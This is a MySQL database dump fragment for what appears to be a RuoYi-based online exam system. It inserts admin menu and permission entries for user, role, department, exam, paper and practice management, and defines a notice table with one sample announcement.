INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1004, '用户导出', 100, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:user:export', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1005, '用户导入', 100, 6, '', '', '', 1, 0, 'F', '0', '0', 'system:user:import', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1006, '重置密码', 100, 7, '', '', '', 1, 0, 'F', '0', '0', 'system:user:resetPwd', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1007, '角色查询', 101, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:role:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1008, '角色新增', 101, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:role:add', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1009, '角色修改', 101, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:role:edit', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1010, '角色删除', 101, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:role:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1011, '角色导出', 101, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:role:export', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1012, '菜单查询', 102, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1013, '菜单新增', 102, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:add', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1014, '菜单修改', 102, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:edit', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1015, '菜单删除', 102, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:menu:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1016, '部门查询', 103, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1017, '部门新增', 103, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:add', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1018, '部门修改', 103, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:edit', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1019, '部门删除', 103, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:dept:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1020, '岗位查询', 104, 1, '', '', '', 1, 0, 'F', '0', '0', 'system:post:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1021, '岗位新增', 104, 2, '', '', '', 1, 0, 'F', '0', '0', 'system:post:add', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1022, '岗位修改', 104, 3, '', '', '', 1, 0, 'F', '0', '0', 'system:post:edit', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1023, '岗位删除', 104, 4, '', '', '', 1, 0, 'F', '0', '0', 'system:post:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1024, '岗位导出', 104, 5, '', '', '', 1, 0, 'F', '0', '0', 'system:post:export', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1025, '字典查询', 105, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1026, '字典新增', 105, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:add', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1027, '字典修改', 105, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:edit', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1028, '字典删除', 105, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1029, '字典导出', 105, 5, '#', '', '', 1, 0, 'F', '0', '0', 'system:dict:export', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1030, '参数查询', 106, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1031, '参数新增', 106, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:add', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1032, '参数修改', 106, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:edit', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1033, '参数删除', 106, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1034, '参数导出', 106, 5, '#', '', '', 1, 0, 'F', '0', '0', 'system:config:export', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1035, '公告查询', 107, 1, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1036, '公告新增', 107, 2, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:add', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1037, '公告修改', 107, 3, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:edit', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1038, '公告删除', 107, 4, '#', '', '', 1, 0, 'F', '0', '0', 'system:notice:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1039, '操作查询', 500, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1040, '操作删除', 500, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1041, '日志导出', 500, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:operlog:export', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1042, '登录查询', 501, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1043, '登录删除', 501, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:remove', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1044, '日志导出', 501, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:export', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1045, '账户解锁', 501, 4, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:unlock', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1046, '在线查询', 109, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:query', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1047, '批量强退', 109, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:batchLogout', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1048, '单条强退', 109, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:forceLogout', '#', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2009, '数据管理', 0, 5, 'dataControl', NULL, NULL, 1, 0, 'M', '0', '0', NULL, 'form', 'admin', '2023-10-25 09:54:37', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2010, '题目管理', 2009, 1, 'exercise', 'dataControl/exercise/index', NULL, 1, 0, 'C', '0', '0', 'dataControl:exercise:list', 'list', 'admin', '2023-10-25 09:55:52', 'admin', '2023-10-25 14:38:39', '题目管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2011, '题目查询', 2010, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exercise:query', '#', 'admin', '2023-10-25 09:55:52', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2012, '题目新增', 2010, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exercise:add', '#', 'admin', '2023-10-25 09:55:52', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2013, '题目修改', 2010, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exercise:edit', '#', 'admin', '2023-10-25 09:55:52', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2014, '题目删除', 2010, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exercise:remove', '#', 'admin', '2023-10-25 09:55:52', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2015, '题目导出', 2010, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exercise:export', '#', 'admin', '2023-10-25 09:55:52', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2022, '试卷管理', 2009, 1, 'paper', 'dataControl/paper/index', NULL, 1, 0, 'C', '0', '0', 'dataControl:paper:list', 'documentation', 'admin', '2023-10-25 15:14:07', 'admin', '2023-10-26 16:30:03', '试卷管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2023, '试卷管理查询', 2022, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:paper:query', '#', 'admin', '2023-10-25 15:14:07', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2024, '试卷管理新增', 2022, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:paper:add', '#', 'admin', '2023-10-25 15:14:07', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2025, '试卷管理修改', 2022, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:paper:edit', '#', 'admin', '2023-10-25 15:14:07', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2026, '试卷管理删除', 2022, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:paper:remove', '#', 'admin', '2023-10-25 15:14:07', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2027, '试卷管理导出', 2022, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:paper:export', '#', 'admin', '2023-10-25 15:14:07', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2028, '考试管理', 2009, 1, 'exam', 'dataControl/exam/index', NULL, 1, 0, 'C', '0', '0', 'dataControl:exam:list', 'edit', 'admin', '2023-11-03 14:17:53', 'admin', '2023-11-03 14:23:30', '考试管理菜单');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2029, '考试管理查询', 2028, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exam:query', '#', 'admin', '2023-11-03 14:17:53', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2030, '考试管理新增', 2028, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exam:add', '#', 'admin', '2023-11-03 14:17:53', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2031, '考试管理修改', 2028, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exam:edit', '#', 'admin', '2023-11-03 14:17:53', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2032, '考试管理删除', 2028, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exam:remove', '#', 'admin', '2023-11-03 14:17:53', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2033, '考试管理导出', 2028, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'dataControl:exam:export', '#', 'admin', '2023-11-03 14:17:53', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2034, '在线考试', 0, 6, 'stu/exam', 'stu/exam/index', NULL, 1, 0, 'C', '0', '0', 'stu:exam:list', 'skill', 'admin', '2023-11-04 21:19:02', '', NULL, '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2035, '刷题练习', 0, 7, 'stu/practice', 'stu/practice/index', NULL, 1, 0, 'C', '0', '0', 'stu:practice:list', 'job', 'admin', '2023-11-06 20:45:32', 'admin', '2023-11-06 20:50:37', '');
INSERT INTO `sys_menu` (`menu_id`, `menu_name`, `parent_id`, `order_num`, `path`, `component`, `query`, `is_frame`, `is_cache`, `menu_type`, `visible`, `status`, `perms`, `icon`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2036, '错题回顾', 0, 8, 'stu/error', 'stu/error/index', NULL, 1, 0, 'C', '0', '0', 'stu:error:list', 'list', 'admin', '2023-11-07 09:24:28', '', NULL, '');
COMMIT;

-- ----------------------------
-- Table structure for sys_notice
-- ----------------------------
DROP TABLE IF EXISTS `sys_notice`;
CREATE TABLE `sys_notice` (
  `notice_id` int NOT NULL AUTO_INCREMENT COMMENT '公告ID',
  `notice_title` varchar(50) COLLATE utf8mb4_general_ci NOT NULL COMMENT '公告标题',
  `notice_type` char(1) COLLATE utf8mb4_general_ci NOT NULL COMMENT '公告类型（1通知 2公告）',
  `notice_content` longblob COMMENT '公告内容',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '公告状态（0正常 1关闭）',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`notice_id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='通知公告表';

-- ----------------------------
-- Records of sys_notice
-- ----------------------------
BEGIN;
INSERT INTO `sys_notice` (`notice_id`, `notice_title`, `notice_type`, `notice_content`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, '温馨提醒：2018-07-01 若依新版本发布啦', '2', 0xE696B0E78988E69CACE58685E5AEB9, '0', 'admin', '2023-10-23 20:57:31', '', NULL, '管理员');
